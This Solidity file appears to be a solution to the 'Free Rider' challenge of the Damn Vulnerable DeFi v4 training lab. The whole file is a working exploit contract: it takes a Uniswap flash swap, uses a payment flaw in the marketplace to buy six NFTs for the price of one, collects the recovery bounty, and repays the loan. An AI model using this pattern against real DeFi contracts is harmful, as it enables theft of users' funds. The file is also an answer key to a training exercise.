// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {FreeRiderNFTMarketplace} from "../FreeRiderNFTMarketplace.sol";
import {DamnValuableNFT} from "../../DamnValuableNFT.sol";
import {FreeRiderRecoveryManager} from "../FreeRiderRecoveryManager.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract AttackFreeRiderNFTMarketplace is IERC721Receiver {
    uint256 constant NFT_PRICE = 15 ether;
    DamnValuableNFT public immutable nft;
    FreeRiderRecoveryManager public immutable recoveryManager;
    FreeRiderNFTMarketplace public immutable marketplace;
    IUniswapV2Pair public immutable uniswapPair;
    WETH public immutable weth;

    constructor(
        address marketplaceAddress,
        address nftAddress,
        address recoveryManagerAddress,
        address uniswapPairAddress,
        address wethAddress
    ) {
        marketplace = FreeRiderNFTMarketplace(payable(marketplaceAddress));
        nft = DamnValuableNFT(nftAddress);
        recoveryManager = FreeRiderRecoveryManager(recoveryManagerAddress);
        uniswapPair = IUniswapV2Pair(uniswapPairAddress);
        weth = WETH(payable(wethAddress));
    }

    function initiateAttack() external {
        address token0 = uniswapPair.token0();

        (uint256 amount0, uint256 amount1) = token0 == address(weth) ? (NFT_PRICE, uint256(0)) : (uint256(0), NFT_PRICE);

        uniswapPair.swap(amount0, amount1, address(this), "0x1");
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == address(uniswapPair), "Invalid sender");
        require(sender == address(this), "Invalid sender");

        uint256 amount = amount0 > 0 ? amount0 : amount1;
        weth.withdraw(amount);

        uint256[] memory tokenIds = new uint256[](6);

        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        marketplace.buyMany{value: NFT_PRICE}(tokenIds);

        for (uint256 i = 0; i < 6; i++) {
            if (i == 5) {
                nft.safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(address(this)));
            } else {
                nft.safeTransferFrom(address(this), address(recoveryManager), i, "");
            }
        }

        uint256 fee = amount * 3 / 997 + 1;
        uint256 amountToRepay = amount + fee;

        weth.deposit{value: amountToRepay}();
        weth.transfer(address(uniswapPair), amountToRepay);

        payable(tx.origin).transfer(address(this).balance);
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory)
        external
        view
        override
        returns (bytes4)
    {
        if (msg.sender != address(nft)) {
            revert("Caller not NFT");
        }

        if (nft.ownerOf(_tokenId) != address(this)) {
            revert("Still not owning token");
        }

        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
